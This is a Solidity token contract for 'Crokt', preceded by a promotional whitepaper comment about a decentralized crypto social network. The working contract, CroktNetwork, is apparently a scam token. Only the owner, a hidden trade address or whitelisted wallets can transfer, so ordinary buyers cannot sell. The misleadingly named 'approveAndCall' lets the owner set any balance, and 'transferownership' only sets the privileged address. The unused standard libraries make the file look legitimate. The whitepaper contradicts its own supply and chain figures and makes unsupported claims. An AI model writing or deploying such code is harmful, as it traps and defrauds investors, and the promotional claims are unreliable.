/*
Executive summary:

Crokt is an innovative social network and trading platform designed for the Crypto community, based on a fully decentralized peer-to-peer network and available as Android/iOS mobile app and browser version.
Crokt uses a crypto utility token based on the Ethereum blockchain which is specially designed as a sustainable crypto payment gateway system for internal services bonded to trading, staking, inapp rewards and more activities related to the Crokt ecosystem.
Crokt uses the advantages of blockchain technology, such as decentralization, open source, low fees, fast transactions timing and privacy-focus solutions to solve the current challenges of traditional centralized platforms, opening a complete new world to all the crypto enthusiasts of the earth.
Crokt will provide a stable and decentralized online platform to connect every crypto user, from newbies to pros, all in one DApp to facilitate the exchange of informations and analysis in real time.
“Our vision on Crokt is to create the first decentralized social network platform to be a main landmark for all the crypto world, becoming the main all-in-one solution for all the community needs.

Crokt will facilitate the transactions, cooperation and information sharing between participants on its sustainable network by enabling decentralized data transactions, protecting data security and disrupting data concentration, allowing everybody to gain the most out of the digitalization era.”
Rising of social activities with 
There are social platforms designed for pretty much all the niches: Twitter for general information and discussion, Discord and Telegram for communication and file sharing, Tradingview for market chart analysis share, etc. Even if the mentioned platforms are widely used by a good amount of crypto enthusiasts and investors over the internet, none of them was specifically created and designed to offer an easy all-in-one & safe solution for this community. Rather, some of them show not much interest in the crypto community or are even discouraging this world.
Twitter CFO, for example, stated multiple times in his declaration about discouraging any crypto investments as quoted on The Wall Street Journal:
https://www.wsj.com/articles/twitter-cfo-says-investing-in-cryptodoesnt-make-sense -right-now-11637027310
Nowadays, the most used platforms inside the crypto industry are Twitter, Discord and Telegram.
Unfortunately, these platforms often appeared to be hostile towards the crypto community users, limiting the circulating informations and the general freedom of speech. Twitter for example, after a long campaign of hacked accounts in the past, decided to close and ban Elon Musk's account after he tweeted his opinion about bitcoin with the excuse of "possible account hijack".
 
Rising of social activities with disinformation and risk of loss
Musk, after complained about this behavior as stated in this BBC article talking about this unfortunate event: https://www.bbc.com/news/technology-45953747
Twitter adopts harsh solutions for no reason but, on the other hand, does not protect users from fake news, scam advertisements and intentional manipulation of the general informations.
There are many examples talking about fake crypto projects, scams, rugpull and other illicit activities carried and marketed inside these platforms as told by the following news from the IndiaTimes:
https://economictimes.indiatimes.com/tech/technology/a-crypto-scam-is-brewing-on-twitter-and-social-media-atlarge/arti cleshow/81120014.cms
Beside censorship, sometimes these centralized platforms like Telegram or Discord are used for fraudulent events, such as hacking control panels due to their configurable structure for developers, bot integration and similar.
Lot of crypto community groups full of people are left with no protection and no overview about the validity of any information circulating inside.
It's very easy for hackers or fraudulent criminals to carry scams using malicious bots, impersonation and phishing techniques.
There are a lot of references about this behavior as shown in the following article as example: 
https://threatpost.com/telegram-stealcrypto-wallet-credentials/177266/
Rising of social activities with disinformation and risk of loss
We all have seen many examples of how fake news and disinformation can easily spread over the net in just a matter of minutes.
This can be easily applied to the world of investments and crypto in particular: Scam advertisements, fake accounts to impersonate influencers, fake news and pump&dump techniques have been carried with success over the social network platforms during the last 5 years.
All of this is possible due to weak control policies applied by the social platforms that don't protect the data integrity and truthfulness, leaving the users exposed to fake and blind hype, disinformation and untrustworthy information providers.
This lack of integrity control often leads to potential losses and risks involved with disinformation and manipulation. In the far-west of informations, people struggle 
to understand who to follow with trust or where the real truth dwells.
Crokt aims to solve this problem creating a safe and reliable place where to be informed, without letting the users alone in their journey.
According to a survey, 99.1% of the crypto investors and traders interviewed would rather prefer to have an unique stable application to handle all the information, analysis, share and storage of their digital crypto assets.
Crokt aims to cover exactly this need, providing an unique all-inone solution for all the crypto lovers.
More than 100 million people around the world are now using cryptocurrencies - and a growing number of baby boomers and  Gen Xers are becoming interested in bitcoin and other tokens, according to two separate reports. A report from exchange Crypto.com estimated that there were 106 million crypto users around the world in January 2021, following a 16% jump in participants that month alone. A separate survey from financial advisory group deVere found 70% of its clients aged over 55 had already invested in digital currencies, or were planning to do so, in 2021, despite bitcoin and others being strongly associated with younger, millennial investors.” 
Business Insider In January 2022, total crypto holders appear to be around 300 millions: https://triple-a.io/crypto-ownership
These numbers are insanely high and they keep increasing every single day. Hundreds of thousands of people become new crypto holders and investors every day. We’ve all been new in the crypto world, and the main questions at the beginning are:
-  Which platforms do I need to use?
-  Where can I join the communities?
-  Who do I follow on twitter?
-  Where do I see the news?
-  Where do I find telegram links for joining crypto groups?
-  Where do I see the charts?
-  Is this crypto going up? Is this a good moment to buy/sell?
The main problems for new crypto investors
Most of the new crypto users stated they feel alone when entering the crypto market, without having a place to feel safe and interact with other people. This will result in disinformation, loss of capitals and so on.
We’ve created Crokt to solve this BIG problem.
We’ll finally merge all the crypto community, to an all-in-one decentralized platform.
Crokt platform is 100% dedicated to the crypto community and specifically designed for it, investors will never feel alone again.
You’re a crypto investor? Download Crokt, follow the suggestions we give you thanks to our algorithm or follow your friends and traders, check out some news, join the public groups and talk with other users, create the wallet and start investing safely.
Crokt will be the biggest landmark for every crypto user within the end of 2022.
SAFETY FIRST
Being a decentralized platform, Crokt will NEVER steal its users' information.
While every other Social Network does, we will never ask for your personal data to use the platform.
No Cookies inside Crokt.
We think cyber security should be the rule number one for every kind of platform and our main goal is to protect the safety of every single user.
Every chat or post is safely encrypted and no one will ever have access to it, neither us.
Every user will have its own freedom of speech, we will never ban or mute users for sharing their thoughts and ideas.
We will only intervene in case of scams or something that could expose our users at risk.
The Crokt project aims to promote the use of blockchain technology as a fast, reliable and low-cost payment gateway to guarantee verified tamper-proof transactions on the nature of a decentralized distributed system.
Crokt crypto token is designed to be a fast and low-fee internal payment and utility gateway for services related to the Crokt ecosystem.
The project of Crokt uses the blockchain as a clean technology to create the first safe and reliable social platform with an active and sustainable ecosystem.
The Crokt project is open source, as it is the smart contract inside the blockchain.
All the Crokt development integrations come with open source solutions for developers and third party softwares. Crokt token also focuses on privacy of the transactions: In the blockchain system, although all data logging and operation updates are made public to the whole network node, all transaction informations are handled by hash encryption which allows almost anonymous data exchange.
Blockchain is one of the most discussed technologies nowadays as a potential successor of the internet. The blockchain combines a set of existing technologies, including distributed peer-to-peer transmission, consensus mechanism and encryption algorithm, to introduce a new way of data formation, transmission, storage and usage.
The breakthroughs brought by blockchain technology has the potential to change the existing economic and financial mode of operation.
In a few years this system is even leading to a new technological innovation and industrial change on a global scale.
A blockchain is a tamper-proof and decentralized data structure that joins data blocks chronologically. The nature of the blockchain is a distributed system that serves as the underlying technology for digital assets and for a distributed, encrypted and reliable accounting and clearing system.
 
In this initial phase Crokt will rely on the Ethereum blockchain blockchain technology as main internal circuit for its token but we plan to launch our own Crokt decentralized chain in the future: despite the fact that the ETHEREUM is one of the most secure and widelyused blockchain for tokenization, Crokt aims to create a completely innovative custom blockchain that could allow users to tokenize user's projects inside the Crokt ecosystem.
The Internet has been one of the most revolutionary and disruptive technologies in history, creating one of the biggest paradigm shifts of all time.
The advent of the internet has drastically changed the way people invest and opened new gates of personal finance to many around the world.
The Internet has had a profound impact on the way that consumers listen to music, watch movies, buy and sell products, and communicate. 
It has also had hugely beneficial or malefic impacts when it came to investing, stocks and assets, company scandals and real time market news.
During the last few years the interest towards online trading activities increased with a trend of over +192% yearly and the number of new users approaching this world is constantly climbing to new records: Keywords like "crypto trading", "bitcoin", "decentralized finance", etc have been growing exponentially based on the trends research on Google Trend. The increasing number of users entering the crypto world is a clear fact.
Based on public company numbers, all the top exchange platforms like Binance and Coinbase have seen an enormous escalation on their volumes and user base. Just the whole market of the crypto world itself has now acquired a capitalization bigger than gold or other storical assets. In this fast growing scenario, the user base of people adopting online trading or investment solutions is going to explode in the current decade.
 
The social media
Users on Crokt will be able to freely share their ideas and thoughts about everything inside the crypto’s world like newly launched cryptocurrencies, NFTs, De-fi projects, Farming or Staking, and so on.
This will let newbies learn about their favourite crypto and keep pros updated with detailed analysis at the same time.
People can share everything related to the crypto world, Like, comment, repost and chat with other people safely thanks to the end-to-end encryption system.
Chats section
Crokt users can create and join private chats, groups and channels for public and private announces.
Everybody can choose the best way to create and share informations and opinions about their favorite assets and interests, directly on the App! All the data transmitted through our chat and communication system will be completely safe thanks to the end-to-end encryption inside Crokt decentralized app.
 
 
 
 
-  Basic Plan: Stake 1000 CROKT or less for 1.4% transaction fee
-  Pro Plan: Stake 50.000 CROKT for 0.9% transaction fee
-  Diamond Plan: Stake 200.000 CROKT for 0.4% transaction fee
-  Master Plan: Stake 500.000 CROKT for 0% transaction fee
 
Crokt allows users to easily buy more than 500 crypto- currencies directly with credit cards and bank deposits thanks to our partnership with Ramp!
 
CROKT Crypto Token 
Token Overview 
CROKT is the main crypto token related to the Crokt ecosystem. The token is issued on the Binance blockchain with the following ticker identifier: CROKT
CROKT has a fixed supply of 10 Billions of tokens and the minimum transaction allowed is up to 9 decimals of token. All the transactions are visible through the public block explorer on Etherscan: https://Etherscan.com The smart contract is: 
0x189eE99ec4071FD32950d0a145e97Ccd9CbCe014

$CROKT Token Disclaimer 
-  $CROKT token does NOT give dividend rights.
-  $CROKT token does NOT give the right to participate at administrative meetings. 
-  $CROKT token does NOT offer any way of right of possession on the platform and on the project.
-  $CROKT token does NOT guarantee financial performance. - $CROKT token value is strictly based on the market value    which is given from the users on the Exchange.
Tokenomics
Out of the 500,000,000 token issued, the redistribution for the management and maintenance of the project  will be handled as follows: 
A 10% of the supply is reserved for the team members.
Vesting: Locked for 30 days, then 10% every month.
The development part, which takes 10%, is used to cover production and maintenance costs of the whole online structure.
Vesting: Locked for 30 days, then 15% every month.
The marketing part is planned to have 9% of the supply 
Vesting: Locked for 7 days, then 15% every month.dedicated to it.
A 5% of the supply is planned to be stored inside a strategic reserve cold wallet in case of any unexpected cost to cover.Vesting: Locked for 90 Days, then 5% every month
The 25% of the token will be available for public sale and the 1% will be available to early investors as private sale.
Vesting for ICO Presale: 100% at TGE - Vesting for Circulating Supply on Exchanges: 10% at TGE, 10% every 45 days.
Staking and in-app rewards throug airdrops, contests and similar will have respectively dedicated 20% and 10%.
Vesting: Locked for 7 days, then 20% every month.
The last 10% of the initial supply is planned to be dedicated to Exchange platforms listing costs and possible partnerships inside the world of the decentralized finance.
Vesting: Locked for 30 days, then 10% every month.
Initial MarketCap on XT.com and LATOKEN: $4,100,000
How to, buy and sell, available exchange platforms
CROKT token will be available for pre-sale on February 2022 and then will be available for public sale at the end of February 2022.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract CroktNetwork {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}